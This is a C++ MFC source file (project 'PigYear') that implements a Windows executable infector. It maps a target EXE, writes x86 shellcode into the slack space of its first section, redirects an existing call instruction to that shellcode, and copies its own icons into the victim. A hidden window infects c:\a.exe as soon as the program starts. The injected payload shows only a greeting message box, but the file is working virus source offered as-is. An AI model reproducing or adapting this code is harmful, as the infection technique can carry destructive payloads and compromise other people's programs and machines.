// MainWnd.cpp : implementation file
//

#include "stdafx.h"
#include "PigYear.h"
#include "MainWnd.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/**************************************************************
* ������SetRes
* ������LPSTR szImageName --Ҫ������Դ���µ�EXE��DLL������
        LPSTR szResType -- �������µ���Դ����    
        LPSTR szResName -- �������µ���Դ����
        LPVOID pData -- ��ִ���ļ�����Դ���ݵ�ָ��
        DWORD cbData -- ָ��lpData�е���Դ�������ݴ�С  
* ���ܣ��ú�����������exe�е���Դ
**************************************************************/
int SetRes(LPSTR szImageName,LPSTR szResType,LPSTR szResName,LPVOID pData,DWORD cbData)
{
	HANDLE hExe = BeginUpdateResource(szImageName,0);
	if(hExe==NULL) throw("BeginUpdateResource");
	
	int res = UpdateResource(
		hExe,
		szResType,
		szResName,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
		pData,
		cbData);
	if (!res) throw("UpdateResource");
	
	if (!EndUpdateResource(hExe, 0)) throw("EndUpdateResource");
	
	return 1;
}

/**************************************************************
* ������EnumIconProc
* ������HMODULE hModule --module ���
        LPCTSTR lpszType --��Դ����
        LPTSTR  lpszName --��Դ����
        LONG    lParam --������õĲ���  
* ���ܣ��ú���ö��ԴExe�е�����ͼ�꣬���õ���һ��exe��ȥ
**************************************************************/
BOOL CALLBACK EnumIconProc(HMODULE hModule,LPCTSTR lpszType,LPTSTR lpszName,LONG lParam)
{
	HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
	if (hRes == NULL) throw("Could not locate icon resource.");

    // Load the icon into global memory. 
	HGLOBAL hResLoad = LoadResource(hModule, hRes);
	if (hResLoad == NULL) throw("Could not load icon."); 
	
	// Lock the dialog box into global memory. 
	LPVOID pData = LockResource(hResLoad);
	if (pData == NULL) throw("Could not lock Icon."); 

    DWORD cbData = SizeofResource(hModule, hRes);
	
	if (lParam)
	{
		SetRes((LPSTR)lParam,
			RT_ICON,
			lpszName,
			pData,
			cbData
			);
	}
	
	return TRUE;
}

/**************************************************************
* ������SetExeIcon
* ������LPSTR szLoadFrom--ͼ����ȡ�ļ�
        LPSTR szSetTo --������ͼ���ļ�
* ���ܣ��ú�����һ��Exe�е�ͼ��ת�뵽��һ��exe��ȥ
**************************************************************/
int SetExeIcon(LPSTR szLoadFrom, LPSTR szSetTo)
{
	HMODULE hExe = LoadLibrary(szLoadFrom);//��EXE����������Դ����
	if (hExe == NULL) 
	{
		throw("Could not load icon exe."); 
		return 1;
	}

    EnumResourceNames(
		hExe,    
		RT_ICON,      
        (ENUMRESNAMEPROC) EnumIconProc, 
        (LONG)szSetTo    
		);
	FreeLibrary(hExe);
	return 1;
}

/**************************************************************
* ������InjectCode
* ������char szHostFile[]--����Ⱦ��exe�ļ�·��

* ���ܣ���Ⱦһ��exe����������ʾ��������ꡱ��MessageBox
**************************************************************/
int InjectCode(char szHostFile[])
{//#include <windows.h>
	PIMAGE_DOS_HEADER pImageDosHeader ;
	PIMAGE_NT_HEADERS pImageNtHeaders ;
	PIMAGE_SECTION_HEADER pImageSectionHeader;
	unsigned char thunkcode[] = "\x60\x9c\xe8\x00\x00\x00\x00\x5b"
                            "\x81\xeb\x0d\x10\x40\x00\x6a\x00"
                            "\x8d\x83\x30\x10\x40\x00\x50\x50"
                            "\x6a\x00\xb8\x78\x56\x34\x12\xff"
                            "\xd0\x9d\x61\xff\x25\x3a\x10\x40"
                            "\x00\x90\xBD\xF0\xD6\xED\xB0\xDD"
                            "\xC4\xEA\x00";
    HANDLE hFile ;
    HANDLE hMap ;
    LPVOID pMapping ;
    DWORD dwGapSize ;
    unsigned char *pGapEntry ;
    int i ;
    PROC MsgBox ;
    DWORD OldEntry ;
    int x = 0x18 ;
    int vir_len ;
    unsigned char *pSearch ;
    DWORD *dwCallNextAddr ;
    DWORD *dwCallDataOffset ;
    DWORD *dwCallDataAddr ;
    DWORD dwCallData ;
    DWORD dwCodeDistance ;
    DWORD *dwJmpAddr ;
    DWORD dwJmpData ;
    DWORD dwJmpVA ;

    //:::
    hFile = CreateFile(szHostFile,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL) ;
                        
    if (hFile==INVALID_HANDLE_VALUE)
    {
        return -1 ;
    }
    
    hMap = CreateFileMapping(hFile,
                            NULL,
                            PAGE_READWRITE,
                            0,
                            0,
                            NULL) ;
    if (!hMap)
        return -1 ;
    
    pMapping = MapViewOfFile(hMap,
                        FILE_MAP_ALL_ACCESS,
                        0,
                        0,
                        0) ;
    if (!pMapping)
        return -1 ;
    
    pImageDosHeader = (PIMAGE_DOS_HEADER)pMapping ;
    if (pImageDosHeader->e_magic==IMAGE_DOS_SIGNATURE)
    {
        pImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)pMapping+pImageDosHeader->e_lfanew) ;
        if (pImageNtHeaders->Signature==IMAGE_NT_SIGNATURE)
        {
            pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pMapping+
                                                            pImageDosHeader->e_lfanew+
                                                            sizeof(IMAGE_NT_HEADERS)) ;
            dwGapSize = pImageSectionHeader->SizeOfRawData - pImageSectionHeader->Misc.VirtualSize ;
            
            if (sizeof(thunkcode)>dwGapSize)
                goto Close ;
                
            pGapEntry = (unsigned char *)(pImageSectionHeader->PointerToRawData+
                                            (DWORD)pMapping+
                                            pImageSectionHeader->Misc.VirtualSize) ;
            
            OldEntry = pImageNtHeaders->OptionalHeader.ImageBase+
                        pImageNtHeaders->OptionalHeader.AddressOfEntryPoint ;

            MsgBox = (PROC)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA") ;

            //�޸�Ϊ��ǰϵͳ��MessageBoxA��ַ
            for (i=3;i>=0;i--)
            {
                thunkcode[i+27] = ((unsigned int)MsgBox>>x)&0xff ;
                x -= 8 ;
            }
            x = 24 ;
            
            vir_len = (int)pImageSectionHeader->Misc.VirtualSize ;
            
            pSearch = (unsigned char *)(pImageSectionHeader->PointerToRawData+
                        (DWORD)pMapping) ;
                        
            //:::����callָ��(0xe8)
            for (i=0;i<vir_len;i++)
            {
                if (pSearch[i]==0xe8)
                {
                    dwCallDataAddr = (DWORD *)(&pSearch[i]+1) ;
                    dwCallNextAddr=(DWORD *)(&pSearch[i]+5) ;
                    dwJmpAddr = (DWORD *)(*dwCallDataAddr+ (DWORD)dwCallNextAddr) ;
                    dwJmpVA = (DWORD)dwJmpAddr-
                                ((DWORD)pMapping+pImageSectionHeader->PointerToRawData)+
                                pImageNtHeaders->OptionalHeader.ImageBase+
                                pImageNtHeaders->OptionalHeader.AddressOfEntryPoint ;
                    dwJmpData = *((DWORD *)((unsigned char *)dwJmpAddr+2)) ;

                    if ((*dwJmpAddr&0xffff)==0x25ff)
                    {
                        dwCodeDistance = (DWORD)pGapEntry - (DWORD)dwCallNextAddr ;
                        *dwCallDataAddr = dwCodeDistance ;
                        for (i=3;i>=0;i--)
                        {
                            thunkcode[i+37] = ((unsigned int)dwJmpData>>x)&0xff ;
                            x -= 8 ;
                        }
                        for (i=0;i<sizeof(thunkcode);i++)
                        {
                            pGapEntry[i] = thunkcode[i] ;
                        }
                        break ;
                    }
                }
                
            }
            
        }
    }

Close:
    UnmapViewOfFile(pMapping) ;
    CloseHandle(hMap) ;
    CloseHandle(hFile) ;
    
    return 0 ;
}
/////////////////////////////////////////////////////////////////////////////
// CMainWnd

IMPLEMENT_DYNCREATE(CMainWnd, CFrameWnd)

CMainWnd::CMainWnd()
{
}

CMainWnd::~CMainWnd()
{
}


BEGIN_MESSAGE_MAP(CMainWnd, CFrameWnd)
	//{{AFX_MSG_MAP(CMainWnd)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMainWnd message handlers

BOOL CMainWnd::CreateFrame()
{
	RECT rt={0,0,1,1};
	BOOL ret=FALSE;
	ret=CWnd::CreateEx(0,AfxRegisterWndClass(0), 
		"xicao",~WS_VISIBLE,rt,0,0);
	
	//---------------------
	WormExe("c:\\a.exe");

	return ret; 
}



void CMainWnd::WormExe(char szHostFile[])
{
	char This_File[256];
	memset(This_File,0,256);
	GetModuleFileName(NULL, This_File,256);
	//����ͼ��
	SetExeIcon(This_File,szHostFile);
	Sleep(100);
	//ע�����
	InjectCode(szHostFile);
	Sleep(100);
}
